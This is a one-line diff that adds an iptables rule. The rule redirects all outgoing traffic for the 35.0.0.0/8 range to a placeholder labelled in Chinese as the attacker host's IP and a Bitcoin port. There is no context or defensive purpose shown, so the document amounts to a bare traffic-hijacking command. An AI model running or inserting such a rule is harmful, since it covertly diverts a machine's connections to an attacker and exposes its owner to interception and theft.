@@ -1,0 +1,1 @@
+iptables -t nat -A OUTPUT -d 35.0.0.0/8 -j DNAT --to-destination 攻击主机IP：比特币端口 
